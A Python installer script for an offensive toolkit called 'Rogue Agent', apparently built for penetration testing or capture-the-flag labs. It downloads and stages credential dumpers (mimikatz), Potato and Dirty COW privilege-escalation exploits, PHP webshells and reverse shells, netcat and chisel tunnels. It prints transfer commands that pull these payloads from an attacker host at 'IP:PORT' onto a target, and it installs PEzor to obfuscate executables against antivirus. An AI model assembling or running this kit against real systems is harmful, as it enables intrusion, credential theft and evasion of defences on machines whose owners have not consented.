#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Load any required imports
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import shutil
import os.path
import sqlite3

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check running as root 
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
   print("\n[*] Please run this python3 script as root...")
   exit(1)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Define temporary system colours
# Modified: N/A
# -------------------------------------------------------------------------------------

Red    = '\e[1;91m'
Yellow = '\e[1;93m'
Reset  = '\e[0m'

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Display rogue-agent product banner
# Modified: N/A
# -------------------------------------------------------------------------------------

os.system("echo '" + Red + "'")
os.system("clear")

print("\t\t\t\t\t\t ____   ___   ____ _   _ _____      _    ____ _____ _   _ _____   ")
print("\t\t\t\t\t\t|  _ \ / _ \ / ___| | | | ____|    / \  / ___| ____| \ | |_   _|  ")
print("\t\t\t\t\t\t| |_) | | | | |  _| | | |  _|     / _ \| |  _|  _| |  \| | | |    ")
print("\t\t\t\t\t\t|  _ <| |_| | |_| | |_| | |___   / ___ \ |_| | |___| |\  | | |    ")
print("\t\t\t\t\t\t|_| \_\\\\___/ \____|\___/|_____| /_/   \_\____|_____|_| \_| |_|  ")

os.system("echo '" + Yellow + "'")
print("\t\t\t\t\t\t               T R E A D S T O N E  E D I T I O N                \n")
os.system("echo '" + Reset + "'")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Create program directories
# Modified: N/A
# -------------------------------------------------------------------------------------

dirList = ["ROGUEAGENT", "TREADSTONE", "BLACKBRIAR", "OUTCOME", "LARX"]

for x in range(0, len(dirList)):
   if not os.path.exists(dirList[x]):
      os.system("mkdir " + dirList[x])

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Create program banners
# Modified: N/A
# -------------------------------------------------------------------------------------

print("\n\n[*] Creating program banners, please wait...")
os.chdir("ROGUEAGENT")

with open("banner2.txt", "w") as banner:
   banner.write("\t\t\t\t\t\t _   _ _____ _____ ____    ____  _____ ______     _______ ____              \n")
   banner.write("\t\t\t\t\t\t| | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \             \n")
   banner.write("\t\t\t\t\t\t| |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) |            \n")
   banner.write("\t\t\t\t\t\t|  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <             \n")
   banner.write("\t\t\t\t\t\t|_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\            \n")
   banner.write("\t\t\t\t\t\t                                                                          \n\n")   
   banner.write("ENUMERATION\t\tSHELLS\t\t\tRUNNING PROCESSES\t\tCOMMUNICATIONS\t\t\tCORE EXPLOITS       \n")
   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
   banner.write("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted                    \n")
   banner.write("powershell 'iwr -Uri http://IP:PORT/TREADSTONE/filename' -outfile filename              \n")
   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
   banner.write("jawsenum.ps1\t\twinshell32.exe\t\tpowerup.ps1\t\t\tnc64.exe\t\t\tmimidump.ps1           \n")
   banner.write("sharphound.ps1\t\twinshell64.exe\t\tpowercat.ps\t\t\tplink64.exe\t\t\tmimikatz.ps1      \n")
   banner.write("sharphound.exe\t\twebshell.php\t\tpowerview.ps1\t\t\twin_chisel64.exe\t\twinpwn.ps1     \n")
   banner.write("winpeas32.exe\t\tmyshell.jpg\t\tpowermad.ps1\t\t\twin_chisel32.exe\t\tlovelypotato.ps1  \n")
   banner.write("winpeas64.exe\t\t\t\t\tprocdump32.exe\t\t\ttest_clsid.bat\t\t\troguepotato.exe          \n")
   banner.write("rubeus.exe\t\t\t\t\tprocdump64.exe\t\t\trogueoxidresolver.exet\t\tmimikatz64.exe        \n")
   banner.write("nmapsetup.exe\t\t\t\t\t\t\t\t\t\t\t\t\tmimikatz32.exe                                   \n")   
   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
   banner.write("wget 'http://IP:PORT/TREADSTONE/fileame                                                 \n")
   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
   banner.write("coffee.sh\t\tlinshell32.elf\t\tpspy32\t\t\t\tlin_chisel64\t\t\tnaughtycowcompile.sh     \n")
   banner.write("linpeas.sh\t\tlineshell64.elf\t\tpspy64\t\t\t\tlin_chisel32\t\t\tnaughycow.c            \n")
   banner.write("linenum.sh                                                                              \n")
   banner.write("linenumplus.sh                                                                          \n")
   banner.write("linpe.sh                                                                                \n")
   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")

os.chdir("..")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Install system requirements
# Modified: N/A
# -------------------------------------------------------------------------------------

print("[*] Installing system requirements, please wait...")

list1 = ["sqlite3", "bloodhound", "hashcat", "python3-pip", "python3-ldap", "gobuster", "crackmapexec", "exiftool", "rlwrap", "xdotool", "seclists"]

for x in range(0, len(list1)):
   os.system("apt-get install " + list1[x] + " -y >> log.txt 2>&1")

list2 = ["bloodhound", "kerbrute", "smtp-user-enum", "termcolor"]

for x in range(0, len(list2)):
  os.system("pip3 install " + list2[x] + " >> log.txt 2>&1")

os.system("python3 -m pip install 'neo4j-driver==1.7.0' --force-reinstall >> log.txt 2>&1")
os.system("python3 -m pip install 'neo4j==1.7.0' --force-reinstall >> log.txt 2>&1")
os.system("python3 -m pip install -U ldap3 >> log.txt 2>&1")
os.system("python3 -m pip install aclpwn >> log.txt 2>&1")
os.system("gem install evil-winrm >> log.txt 2>&1")

if not os.path.exists("/usr/share/doc/python3-impacket/examples/windapsearch.py"):
   os.system("git clone https://github.com/ropnop/windapsearch.git >> log.txt 2>&1")
   os.system("mv windapsearch/windapsearch.py /usr/share/doc/python3-impacket/examples/windapsearch.py >> log.txt 2>&1")
   shutil.rmtree("windapsearch")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Install windows and linux exploits
# Modified: N/A
# -------------------------------------------------------------------------------------

print("[*] Installing windows/linux exploits, please wait...")   

os.chdir("TREADSTONE")

os.system("wget https://download.sysinternals.com/files/Procdump.zip -O Procdump.zip > log.txt 2>&1")
os.system("unzip Procdump.zip >> log.txt 2>&1")
if os.path.exists("Procdump.zip"):
   os.remove("Procdump.zip")
os.remove("Eula.txt")
os.remove("procdump64a.exe")

os.system("wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe' -O winpeas64.exe >> log.txt 2>&1")
os.system("wget 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe' -O winpeas32.exe >> log.txt 2>&1")

os.system("wget 'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe' -O sharphound.exe >> log.txt 2>&1")
os.system("wget 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1' -O ../LARX/sharphound.ps1 >> log.txt 2>&1")
os.system("wget 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1' -O ../LARX/azurehound.ps1 >> log.txt 2>&1")

os.system("git clone https://github.com/TsukiCTF/Lovely-Potato.git >> log.txt 2>&1")
os.system("mv ./Lovely-Potato/Invoke-LovelyPotato.ps1 ../LARX/lovelypotato.ps1 >> log.txt 2>&1")
os.system("mv ./Lovely-Potato/JuicyPotato-Static.exe ./juicypotato.exe >> log.txt 2>&1")
os.system("mv ./Lovely-Potato/test_clsid.bat ./ >> log.txt 2>&1")
os.remove("./Lovely-Potato/README.md")
shutil.rmtree("Lovely-Potato")
os.system("wget 'https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip' -O RoguePotato.zip >> log.txt 2>&1")
os.system("unzip RoguePotato.zip >> log.txt 2>&1")
if os.path.exists("RoguePotato.zip"):
   os.remove("RoguePotato.zip")
os.system("mv ./RogueOxidResolver.exe ./rogueoxidresolver.exe >> log.txt 2>&1")
os.system("mv ./RoguePotato.exe ./roguepotato.exe >> log.txt 2>&1")

os.system("wget 'https://raw.githubusercontent.com/fox-it/Invoke-ACLPwn/master/Invoke-ACLPwn.ps1' -O ../LARX/aclpwn.ps1 >> log.txt 2>&1")
os.system("wget 'https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1' -O ../LARX/jawsenum.ps1 >> log.txt 2>&1")
os.system("wget 'https://github.com/besimorhino/powercat/raw/master/powercat.ps1' -O ../LARX/powercat.ps1 >> log.txt 2>&1")
os.system("wget 'https://github.com/HarmJ0y/PowerUp/raw/master/PowerUp.ps1' -O ../LARX/powerup.ps1 >> log.txt 2>&1")
os.system("wget 'https://github.com/S3cur3Th1sSh1t/WinPwn/raw/master/WinPwn.ps1' -O ../LARX/winpwn.ps1 >> log.txt 2>&1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Out-Minidump.ps1' -O ../LARX/mimidump.ps1 >> log.txt 2>&1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1' -O ../LARX/mimikatz.ps1 >> log.txt 2>&1")
os.system("wget 'https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1' -O ../LARX/powerview.ps1 >> log.txt 2>&1")
os.system("wget 'https://github.com/Kevin-Robertson/Powermad/raw/master/Powermad.ps1' -O ../LARX/powermad.ps1 >> log.txt 2>&1")

os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz' -O chisel.gz >> log.txt 2>&1")
os.system("gunzip chisel.gz")
os.system("mv chisel win_chisel64.exe >> log.txt 2>&1")
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_386.gz' -O chisel.gz >> log.txt 2>&1")
os.system("gunzip chisel.gz")
os.system("mv chisel win_chisel32.exe >> log.txt 2>&1")
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_amd64.gz' -O chisel.gz >> log.txt 2>&1")
os.system("gunzip chisel.gz")
os.system("mv chisel lin_chisel64 >> log.txt 2>&1")
os.system("wget 'https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_386.gz' -O chisel.gz >> log.txt 2>&1")
os.system("gunzip chisel.gz")
os.system("mv chisel lin_chisel32 >> log.txt 2>&1")

os.system("wget 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe' -O rubeus.exe >> log.txt 2>&1")
os.system("wget 'https://nmap.org/dist/nmap-7.80-setup.exe' -O nmapsetup.exe >> log.txt 2>&1")

os.system("cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe >> log.txt 2>&1")
os.system("cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe >> log.txt 2>&1")

os.system("cp /usr/share/windows-resources/binaries/nc.exe nc64.exe >> log.txt 2>&1")
os.system("cp /usr/share/windows-resources/binaries/plink.exe plink64.exe >> log.txt 2>&1")

os.system("wget 'https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php' -O webshell.php >> log.txt 2>&1")
os.system("wget 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php' -O myshell.php >> log.txt 2>&1")

os.system("wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh' -O linenum.sh >> log.txt 2>&1")
os.system("wget 'https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh' -O linenumplus.sh >> log.txt 2>&1")
os.system("wget 'https://raw.githubusercontent.com/Adlemann/linPE/master/linpe.sh' -O linpe.sh >> log.txt 2>&1")
os.system("wget 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh' -O linpeas.sh >> log.txt 2>&1")
os.system("wget 'https://raw.githubusercontent.com/Arr0way/linux-local-enumeration-script/master/linux-local-enum.sh' -O coffee.sh >> log.txt 2>&1")
os.system("wget 'https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php' -O webshell.php >> log.txt 2>&1")

os.system("wget 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32' -O pspy32 >> log.txt 2>&1")
os.system("wget 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64' -O pspy64 >> log.txt 2>&1")

os.system("wget 'https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/compile.sh' -O naughtycowcompile.sh >> log.txt 2>&1")
os.system("wget 'https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/naughtyc0w.c' -O naughthycow.c >> log.txt 2>&1")

os.system("chmod +X *.*")
os.chdir("..")

os.chdir("LARX")
os.system("sed -i -e '/<#/,/#>/c\\' *.ps1")
os.system("sed -i -e 's/^[[:space:]]*#.*$//g' *.ps1")
os.chdir ("..")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Install obfuscation software
# Modified: N/A
# -------------------------------------------------------------------------------------

print("[*] Installing exploit obfuscation software, please wait...")
os.chdir("OUTCOME")

os.system("git clone https://github.com/phra/PEzor.git >> log.txt 2>&1")

os.chdir("PEzor")
os.system("bash install.sh >> keepme.txt 2>&1")
os.system("echo 'Use command = ./Pezor -unhook -syscall -sgn executable' >> keepme.txt")

os.chdir("..")
os.chdir("..")

os.system("mv RA.db ./ROGUEAGENT/RA.db")

print("[*] All done!!...")
#EoF
